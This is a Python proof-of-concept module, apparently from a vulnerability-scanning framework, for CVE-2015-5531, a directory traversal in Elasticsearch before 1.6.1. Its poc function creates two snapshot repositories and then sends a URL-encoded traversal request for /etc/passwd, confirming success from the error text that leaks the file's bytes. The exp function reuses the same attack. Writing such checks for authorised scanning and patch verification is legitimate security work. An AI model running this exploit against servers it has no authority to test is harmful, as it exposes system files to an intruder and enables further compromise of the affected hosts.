import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ElasticSearch directory traversal vulnerability (CVE-2015-5531)''',
        "description": '''Directory traversal vulnerability in Elasticsearch before 1.6.1 allows remote attackers to read arbitrary files via unspecified vectors related to snapshot API calls.''',
        "severity": "high",
        "references": [
            "https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531", 
            "https://nvd.nist.gov/vuln/detail/CVE-2015-5531"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2015", "elasticsearch"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/_snapshot/test"""
        method = "PUT"
        data = """{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test"
    }
}"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/_snapshot/test2"""
        method = "PUT"
        data = """{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
    }
}"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd """
        method = "GET"
        data = """"""
        headers = {}
        resp2 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""ElasticsearchParseException""" in resp2.text and """Failed to derive xcontent from""" in resp2.text and """114, 111, 111, 116, 58""" in resp2.text) and (resp2.status_code == 400):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url